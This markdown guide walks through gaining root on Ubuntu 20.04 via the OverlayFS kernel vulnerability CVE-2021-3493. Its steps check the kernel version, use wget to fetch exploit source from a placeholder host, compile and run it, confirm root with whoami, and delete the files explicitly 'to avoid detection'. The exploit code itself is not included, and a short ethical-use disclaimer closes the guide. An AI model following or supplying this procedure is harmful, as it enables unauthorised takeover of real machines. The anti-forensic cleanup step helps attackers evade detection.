```markdown
# Privilege Escalation via Kernel Exploit (CVE-2021-3493)

## Overview
This guide outlines the steps to exploit a kernel vulnerability (CVE-2021-3493) to escalate privileges on a system running Ubuntu 20.04 LTS with kernel version `5.4.0-42-generic`. The exploit leverages a vulnerability in the OverlayFS subsystem, allowing a local attacker to gain root privileges.

## Prerequisites
- Access to the target system as a non-root user.
- Kernel version `5.4.0-42-generic` (vulnerable to CVE-2021-3493).
- Basic knowledge of compiling and executing C code.

## Step 1: Verify Kernel Version
Ensure the kernel version matches the vulnerable version:
```bash
uname -r
```
Output should be:
```
5.4.0-42-generic
```

## Step 2: Download the Exploit Code
Download the exploit code for CVE-2021-3493 from a trusted source:
```bash
wget https://example.com/exploit.c -O cve-2021-3493.c
```

## Step 3: Compile the Exploit
Compile the exploit using `gcc`:
```bash
gcc cve-2021-3493.c -o exploit
```

## Step 4: Execute the Exploit
Run the compiled exploit to escalate privileges:
```bash
./exploit
```

## Step 5: Verify Privilege Escalation
Check if the exploit was successful by verifying the current user:
```bash
whoami
```
Output should be:
```
root
```

## Step 6: Clean Up
Remove the exploit binary and source code to avoid detection:
```bash
rm -f exploit cve-2021-3493.c
```

## Important Notes
- **Ethical Use**: Only perform this exploit on systems you own or have explicit permission to test.
- **System Stability**: Exploiting kernel vulnerabilities can lead to system instability or crashes. Proceed with caution.
- **Legal Compliance**: Ensure compliance with local laws and regulations before attempting any form of exploitation.

## References
- [CVE-2021-3493 Details](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3493)
- [OverlayFS Vulnerability](https://www.example.com/overlayfs-vulnerability)
```